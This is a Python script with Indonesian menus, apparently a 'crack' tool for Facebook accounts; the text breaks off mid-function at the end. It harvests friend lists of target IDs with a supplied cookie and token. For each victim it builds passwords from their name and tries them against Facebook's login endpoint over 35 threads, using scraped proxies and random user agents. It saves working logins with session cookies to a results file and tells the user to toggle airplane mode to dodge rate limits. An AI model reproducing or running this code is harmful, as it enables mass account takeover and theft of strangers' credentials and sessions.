'''
sc ini di satuin oleh firzah
'''
import os
try:
   import requests
except ImportError:
   os.system('cls' if os.name == 'nt' else 'clear')
   Load().cek_modul()
   os.system("pip install requests")

try:
   import bs4 
except ImportError:
   os.system('cls' if os.name == 'nt' else 'clear')
   Load().cek_modul()
   os.system("pip install bs4")

try:
   import rich
except ImportError:
   os.system('cls' if os.name == 'nt' else 'clear')
   Load().cek_modul()
   os.system("pip install rich")
file_path = os.path.join('RESULT', '.proxy.txt')
if not os.path.exists('RESULT'):
    os.makedirs('RESULT')
if not os.path.exists(file_path):
    with open(file_path, 'w') as f:
        f.write('') 
try:
    proxy = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('RESULT/.proxy.txt','w+').write(proxy)
except Exception as e:
    proxy = open('RESULT/proxy.txt','r').read().splitlines()
import requests,re,random,sys,datetime
from time import sleep
from rich.console import Console
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor as AsepGanteng

###----WARNA COLOR----###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m' # WARNA MATI

class RESULIT:

    def cek_result(self):
        Console(width=50, style="bold green").print(Panel("[italic white]1. Hasil [bold green]OK[italic white]\n2. Hasil [bold red]CP[italic white]",subtitle="╭───",subtitle_align="left"))
        x = Console().input("[bold green]   ╰─> ")
        try:
            if x == "1":
                with open("RESULT/OK.txt", "r") as file:
                    Console(width=50, style="bold green").print(Panel(f"[bold green]{file.read()}[italic white]"))
            elif x == "2":
                with open("RESULT/CP.txt", "r") as file:
                    Console(width=50, style="bold green").print(Panel(f"[bold red]{file.read()}[italic white]"))
            else:
                print(f"input hanya dengan angka,jangan kosong.")
                sleep(2)
                exit()
        except FileNotFoundError:
            print("File Tidak Ditemukan")
            exit()

class LOGE:

    def logo_ku(self):
        os.system("cls" if os.name == "nt" else "clear")
        Console(width=50, style="bold green").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●[italic white]
                                                          
      \r██    ██  ██████   ██████  ███████ 
      \r██    ██ ██    ██ ██       ██      
      \r██    ██ ██    ██ ██   ███ █████   
      \r ██  ██  ██    ██ ██    ██ ██      
      \r  ████    ██████   ██████  ███████ 
                                                          
      \rAuthor : [bold green] MURPHYZZXX[/]  Version : [bold green]7.0[/]"""))
class Load:

    def __init__(self):
        self.ric = Console()
        self.dat = [1, 2]

    def cek_coki(self):
        with self.ric.status("[bold white] mengecek cookie...") as d:
            while self.dat:
                self.dat.pop(0)
                sleep(1)

    def ubah_taa(self):
        with self.ric.status("[bold white] mengubah data...") as d:
            while self.dat:
                self.dat.pop(0)
                sleep(1)

    def cek_modul(self):
        with self.ric.status("[bold white] tunggu sedang install modul...") as d:
            while self.dat:
                self.dat.pop(0)
                sleep(3)
class COOU:

    def login_cok(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            Console(width=50, style="bold green").print(Panel("[italic white]Masukan Cookies Facebook,Saran jangan Menggunkan Cookies Pribadi[italic white]",subtitle="╭───",subtitle_align="left"))
            cok = Console().input("[bold green]   ╰─> ")
            open('.cok.txt','w').write(cok)
            with requests.Session() as r:
                try:
                    r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
                    response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cok})
                    if  '"access_token":' in str(response.headers):
                        token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1);open('.tok.txt','w').write(token)
                    else:Console(width=50, style="bold green").print(Panel("[italic red]Cookies Invalid...[italic white]"));exit()
                except Exception as e:print(e);exit()
            Console(width=50, style="bold green").print(Panel("[italic white]Login Berhasil[italic white]"))
            sleep(2);exit()
        except Exception as e:os.system('rm -rf .cok.txt');os.system('rm -rf .tok.txt');print(e);exit()
class Menu:

    def tampil_menu(self):
        try:
            open('.cok.txt','r').read()
            open('.tok.txt','r').read()
        except(IOError,KeyError,FileNotFoundError):
            os.system('cls' if os.name == 'nt' else 'clear')
            Load().cek_coki()
            Console(width=50, style="bold green").print(Panel("[bold red]Cookies Mati...[italic white]"))
            sleep(3)
            COOU().login_cok()
        os.system('cls' if os.name == 'nt' else 'clear')
        LOGE().logo_ku()
        Console(width=50, style="bold green").print(Panel("[italic white]1. Crack Akun Facebook    3. Cek Hasil Crack\n2. Crack Dump ID Facebook   0. Keluar[italic white]",subtitle="╭───",subtitle_align="left"))
        x = Console().input("[bold green]   ╰─> ")
        if x in ["1", "01"]:VALIDATE().dump_massal()
        elif x in ["2", "02"]:DUMPX().dump_file()
        elif x in ["3", "03"]:RESULIT().cek_result()
        elif x in ["0", "00"]:os.system("rm -rf .cok.txt");os.system("rm -rf .tok.txt");print('Keluar Berhasil');exit()
        else:print('Pilihan Yang Bener');sleep(2);self.tampil_menu()

def AsepGantengPol(yusup):
   for e in yusup + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      sleep(0.05)

class VALIDATE:
    def __init__(self):
        self.loop,self.cps,self.oks,self.a2f = 0,0,0,0
        self.id,self.uid,self.uid2 = [],[],[]
        self.pwnya,self.metode,self.ugen = [],[],[]
        self.dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
        self.dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
        self.tgl = datetime.datetime.now().day
        self.bln = self.dic[(str(datetime.datetime.now().month))]
        self.tahun = datetime.datetime.now().year
        self.okc = 'OK-'+str(self.tgl)+'-'+str(self.bln)+'-'+str(self.tahun)+'.txt'
        self.cpc = 'CP-'+str(self.tgl)+'-'+str(self.bln)+'-'+str(self.tahun)+'.txt'
    
    def AsepGanteng(self,yusup):
        for e in yusup + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.05)

    def dump_massal(self):
        try:
            token = open('.tok.txt','r').read()
            cok = open('.cok.txt','r').read()
        except (IOError,KeyError,FileNotFoundError):
            Console(width=50, style="bold green").print(Panel("[italic white]Cookies Mati...[italic white]"))
            exit()
        try:
            Console(width=50, style="bold green").print(Panel("[italic white]Cari ID Yang Tidak Perivat,Usahkan Cari ID Deket Daerah Kamu Biar Hasil [bold green]( IJO )[/] Masukan ID Target [bold red]Contoh[/] [bold green]100092235011928[/] Kalu Pengen Dump Id Banya Kasih [bold green]( , )[/] Kaya Contoh Di Bawah\n[bold green]61564919994826[/],[bold green]61560115013873[/],[bold green]100092235011928 [italic white] [italic white]",subtitle="╭───",subtitle_align="left"))
            xx = Console().input("[bold green]   ╰─> ")
        except ValueError:
            Console(width=50, style="bold green").print(Panel("[italic white]Input Salah...[italic white]"))
            exit()
        if str(xx) == '':
            Console(width=50, style="bold green").print(Panel("[italic white]Gagal Dump Kemungkinan ID Perivat...[italic white]"))
            exit()
        ses = requests.Session()
        jumlah = xx.split(',')
        for xmx in jumlah:
            self.uid.append(xmx)
        for user in self.uid:
            try:
                url = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
                for x in url['friends']['data']:
                    try:
                        Console(width=50, style="bold green").print(f"[italic white]Tunggu Sedang Dump ID... {len(self.id)}",end="\r")
                        self.id.append(x['id']+'|'+x['name'])
                    except:continue
            except (KeyError,IOError):pass
        try:
            self.setting()
        except requests.exceptions.ConnectionError:print("Tidak Ada Koneksi Internet");exit()

    def setting(self):
        Console(width=50, style="bold green").print(Panel("[italic white]1. Muda\n[italic white]2. Random [italic white]",subtitle="╭───",subtitle_align="left"))
        urutan_setting = Console().input("[bold green]   ╰─> ")
        if urutan_setting in ['1','01','new']:
            muda=[]
            for new in sorted(self.id):
                muda.append(new)
            bcm=len(muda)
            bcmi=(bcm-1)
            for xmud in range(bcm):
                self.uid2.append(muda[bcmi])
                bcmi -=1
        elif urutan_setting in ['2','02','random']:
            for acak in self.id:
                xx = random.randint(0,len(self.uid2))
                self.uid2.insert(xx,acak)
        else:
            print(f"input hanya dengan angka,jangan kosong.")
            exit()
        Console(width=50, style="bold green").print(Panel("[italic white]1. Reguler\n2. Validate[italic white]",subtitle="╭───",subtitle_align="left"))
        login_metode = Console().input("[bold green]   ╰─> ")
        if login_metode == "1":self.Validate()
        elif login_metode == "2":self.Async()
        else:Console(width=50, style="bold green").print(Panel("[italic white]Input Salah...[italic white]"))


    def Validate(self):
        Console(width=50, style="bold green").print(Panel("[italic white]Masukan Password Tambhan [bold red]Contoh[/]\n[bold green]kamu nanya[/],[bold green]Asep Ganteng[/],[bold green]Indonesia[italic white][italic white]",subtitle="╭───",subtitle_align="left"))
        pw = Console().input("[bold green]   ╰─> ")
        pw_nya = pw.split(',')
        for xxs in pw_nya:
            self.pwnya.append(xxs)
        Console(width=50, style="bold green").print(Panel(f"[italic white]Mainkan Mode Pesawat setiap [bold red]200[/] Detik,Trik Biar dapet Hasil [bold green]( IJO )[/] Usahkan Cari ID New[italic white]\n[bold green]{self.okc}[italic white] [bold red]{self.cpc}[italic white]"))
        with AsepGanteng(max_workers=35) as AsepYusup:
            for user in self.uid2:
                uid,nama = user.split('|')[0],user.split('|')[1].lower()
                depan = nama.split(" ")[0]
                pasw = []
                try:
                    if len(nama)<6:
                        if len(depan)<3:pass
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+"01")
                            pasw.append(depan+"02")
                            pasw.append(depan+"03")
                            pasw.append(depan+"04")
                            pasw.append(depan+"05")
                            pasw.append(depan+"06")
                            pasw.append(depan+"07")
                            pasw.append(depan+"08")
                            pasw.append(depan+"09")
                            pasw.append(depan+"123456789")
                            pasw.append(depan+" 123@")
                            pasw.append(depan+"321")
                            pasw.append(depan+"123456")
                            pasw.append(depan+"@123")
                            pasw.append(depan+"222")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    else:
                        if len(depan)<3:
                            pasw.append(nama)
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+"01")
                            pasw.append(depan+"02")
                            pasw.append(depan+"03")
                            pasw.append(depan+"04")
                            pasw.append(depan+"05")
                            pasw.append(depan+"06")
                            pasw.append(depan+"07")
                            pasw.append(depan+"08")
                            pasw.append(depan+"09")
                            pasw.append(depan+"123456789")
                            pasw.append(depan+" 123@")
                            pasw.append(depan+"321")
                            pasw.append(depan+"123456")
                            pasw.append(depan+"@123")
                            pasw.append(depan+"222")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    for xx in self.pwnya:
                        pasw.append(xx)
                    if 'Validate' in self.metode:
                        AsepYusup.submit(self._validatee_,uid,pasw)
                    else:
                        AsepYusup.submit(self._validatee_,uid,pasw)
                except:pass
        print("\r")
        Console(width=50, style="bold green").print(Panel(f"[italic white]sukses crack {len(self.uid2)} id,dengan jumlah hasil Live : {self.oks} Chek : {self.cps}[italic white]"))

    
    def Async(self):
        Console(width=50, style="bold green").print(Panel("[italic white]Masukan Password Tambhan [bold red]Contoh[/]\n[bold green]kamu nanya[/],[bold green]Asep Ganteng[/],[bold green]Indonesia[italic white][italic white]",subtitle="╭───",subtitle_align="left"))
        pw = Console().input("[bold green]   ╰─> ")
        pw_nya = pw.split(',')
        for xxs in pw_nya:
            self.pwnya.append(xxs)
        Console(width=50, style="bold green").print(Panel(f"[italic white]Mainkan Mode Pesawat setiap [bold red]200[/] Detik,Trik Biar dapet Hasil [bold green]( IJO )[/] Usahkan Cari ID New[italic white]\n[bold green]{self.okc}[italic white] [bold red]{self.cpc}[italic white]"))
        with AsepGanteng(max_workers=35) as AsepYusup:
            for user in self.uid2:
                uid,Nama = user.split('|')[0],user.split('|')[1].lower()
                depan = Nama.split(" ")[0]
                pasw = []
                try:
                    if len(Nama)<6:
                        if len(depan)<3:pass
                        else:
                            pasw.append(Nama)
                            pasw.append(depan)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    else:
                        if len(depan)<3:
                            pasw.append(Nama)
                        else:
                            pasw.append(Nama)
                            pasw.append(depan)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    for xx in self.pwnya:
                        pasw.append(xx)
                    if 'Async' in self.metode:
                        AsepYusup.submit(self.validt,uid,pasw)
                    else:
                        AsepYusup.submit(self.validt,uid,pasw)
                except:pass
        print("\r")
        Console(width=50, style="bold green").print(Panel(f"[italic white]sukses crack {len(self.uid2)} id,dengan jumlah hasil Live : {self.oks} Chek : {self.cps}[italic white]"))
    
    def uaku(self):
        rr = random.randint
        rc = random.choice
        mmok = rc(["Viera","PASTB"])
        mks = rc(["de-DE","ja-JP","en-AU","en-GB","en-US","pt-BR","zh-CN","zh-TW","ko-KR","ar-SA","ru-RU","it-IT","fr-FR","es-ES"])
        ua = f"Mozilla/5.0 (Linux; U; {mmok}; {mks}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/4.0.0 Chrome/{str(rr(50,200))}.0.{str(rr(2500,6500))}.{str(rr(50,250))} Safari/537.36 SmartTV"
        ua2 = f"Mozilla/5.0 (Linux; U; {mmok};  {mks}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/4.0.0 Chrome/{str(rr(50,200))}.0.{str(rr(2500,6500))}.{str(rr(50,250))} Safari/537.36"
        return rc([ua,ua2])

    def ua_valid(self):
        rr = random.randint
        rc = random.choice
        android_version = (["7.1.2","8.1.0","9.0.0","10.0.0","11.0.0","12.0.0","7.1"])
        bulid_f = random.choice(["NPG47L","NHD47L","NQG47L","NHG47L","NGG47L","root"])
        sermat_tv = (["7.0","8.0","9.0","10.0","11.0","12.0","8.5"])
        uas_mk = f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,250))}.0.{str(rr(2333,6500))}.{str(rr(20,180))} Mobile Safari/537.36 SmartTV/{random.choice(sermat_tv)} (NetCast) (Android)"
        mmek_ua = f"Mozilla/5.0 (Linux; Android {random.choice(android_version)}; X96mini Build/{bulid_f}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,200))}.0.0.{str(rr(2500,6500))}.{str(rr(35,250))} Mobile Safari/537.36"
        return rc([mmek_ua,uas_mk])


    def _validatee_(self,uid,pasw):
        ses = requests.Session()
        sys.stdout.write(f"\r*--> {str(self.loop)}/{len(self.uid2)} {H}OK{P} : {H}{str(self.oks)}{P} {K}CP{P} : {K}{str(self.cps)}{P}"),
        sys.stdout.flush()
        for pwku in pasw:
            try:
                pox = random.choice(proxy)
                proxxy = {'http': 'socks4://'+pox}
                asmy = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1726592730955%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb499108c01eb280f%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dtouch%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfa18b2bcdcaf6cad4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8df46dec19be4265%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%2526frame%253Df09c02719c79342ea%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8df46dec19be4265%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff36479592ee9d9a61%26relation%3Dopener%26frame%3Df09c02719c79342ea%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
                dat = {
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(asmy)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"', str(asmy)).group(1),
    'email': uid,
    'prefill_contact_point': uid,
    'trynum': '1',
    'timezone': '240',
    'lgndim': 'eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNDAsImMiOjI0fQ==',
    'lgnrnd': '052048_Gzhe',
    'lgnjs': '1727785248',
    'prefill_type': 'contact_point',
    'first_prefill_type': 'contact_point',
    'had_cp_prefilled': 'true',
    'had_password_prefilled': 'false',
    'pass': pwku
}
                hd = {'Host': 'web.facebook.com',
'content-length': str(len(dat)),
'cache-control': 'max-age=0',
'sec-ch-ua': '"Android WebView";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'sec-ch-prefers-color-scheme': 'dark',
'origin': 'https://web.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'upgrade-insecure-requests': '1',
'user-agent': self.uaku(),
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'x-requested-with': 'mark.via.gp',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1726592730955%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb499108c01eb280f%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dtouch%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfa18b2bcdcaf6cad4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8df46dec19be4265%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%2526frame%253Df09c02719c79342ea%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8df46dec19be4265%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff36479592ee9d9a61%26relation%3Dopener%26frame%3Df09c02719c79342ea%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br, zstd',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                ses.post("https://web.facebook.com/login/device-based/regular/login/?login_attempt=1",data=dat,headers=hd,proxies=proxxy,allow_redirects=False)
                if "c_user" in ses.cookies.get_dict().keys():
                    self.oks+=1
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print(f"\r{H}[OK] {uid}|{pwku}\n{kuki}{N}")
                    open("RESULT/OK.txt","a").write(f"{uid}|{pwku}|{kuki}|{self.uaku()}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict().keys():
                    self.cps+=1
                    print(f"\r{M}[CP] {uid}|{pwku}{N}")
                    open("RESULT/CP.txt","a").write(f"{uid}|{pwku}\n")
                    break
                else:continue
            except requests.exceptions.ConnectionError:
                sleep(10)
        self.loop+=1

    def validt(self,uid,pasw):
        ses = requests.Session()
        sys.stdout.write(f"\r*--> {str(self.loop)}/{len(self.uid2)} {H}OK{P} : {H}{str(self.oks)}{P} {K}CP{P} : {K}{str(self.cps)}{P}"),
        sys.stdout.flush()
        for pwku in pasw:
            try:
                pox = random.choice(proxy)
                proxxy = {'http': 'socks4://'+pox}
                asmy = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
                dat = {'jazoest': re.search('name="jazoest" value="(.*?)"', asmy).group(1),
'lsd': re.search('name="lsd" value="(.*?)"', asmy).group(1),
'email': uid,
'pass': pwku,
'timezone':'-420',
'lgndim':'eyJ3Ijo1MDEsImgiOjExMTQsImF3Ijo1MDEsImFoIjoxMTE0LCJjIjoyNH0=',
'lgnrnd':'031156_7vDe',
'lgnjs':'1727518316',
'locale':'id_ID',
'next': 'https://m.facebook.com/?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd3f84f7-8f3e-4c94-8023-bd5d0b363e6a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated',
'login_source': 'login_bluebar',
'prefill_contact_point': uid,
'prefill_source': 'browser_dropdown',
'prefill_type': 'contact_point'}
                hd = {'Host': 'web.facebook.com',
'cache-control': 'max-age=0',
'sec-ch-ua': '"Android WebView";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'origin': 'https://web.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'upgrade-insecure-requests': '1',
'user-agent': self.ua_valid(),
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'x-requested-with': 'mark.via.gp',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd3f84f7-8f3e-4c94-8023-bd5d0b363e6a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr',
'accept-encoding': 'gzip, deflate, br, zstd',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                ses.post(f"https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110",data=dat,headers=hd,proxies=proxxy,allow_redirects=False)
                if "c_user" in ses.cookies.get_dict().keys():
                    self.oks+=1
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in requests.utils.dict_from_cookiejar(ses.cookies).items() ])
                    print(f"\r{H}[OK] {uid}|{pwku}\n{kuki}{N}")
                    open("RESULT/OK.txt","a").write(f"{uid}|{pwku}|{kuki};{self.ua_valid()}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict().keys():
                    self.cps+=1
                    print(f"\r{M}[CP] {uid}|{pwku}{N}")
                    open("RESULT/CP.txt","a").write(f"{uid}|{pwku}\n")
                    break
                else:continue
            except requests.exceptions.ConnectionError:
                sleep(10)
        self.loop+=1
from concurrent.futures import ThreadPoolExecutor as tred

class DUMPX:
    def __init__(self):
        self.plist = []
        self.loop,self.cps,self.oks = 0,[],[]

    def dump_file(self):
        Console(width=50, style="bold green").print(Panel("[italic white]Masukan File Dump ID[italic white]\n[bold red]Contoh : dump.txt[italic white]",subtitle="╭───",subtitle_align="left"))
        file = Console().input("[bold green]   ╰─> ")
        try:
            fore = open(file,'r').read().splitlines()
        except FileNotFoundError:Console(width=50, style="bold green").print(Panel("[italic white]File Tidak Ditemukan[italic white]"))
        exit(sleep(2))
        Console(width=50, style="bold green").print(Panel("[italic white]1. Validate[italic white]",subtitle="╭───",subtitle_align="left"))
        mthd = Console().input("[bold green]   ╰─> ")
        try:pw_limit = int(input("Password Limit : "))
        except:pw_limit = 1
        Console(width=50, style="bold green").print(Panel("[bold red]Contoh[/] : [bold green]first last,firstlast,first123[italic white]",subtitle="╭───",subtitle_align="left"))
        for i in range(pw_limit):
            self.plist.append(Console().input(f"[bold green]   ╰─> {i+1} "))
        with tred(max_workers=35) as pool:
            for i in fore:
                try:
                    uid,name = i.split('|')
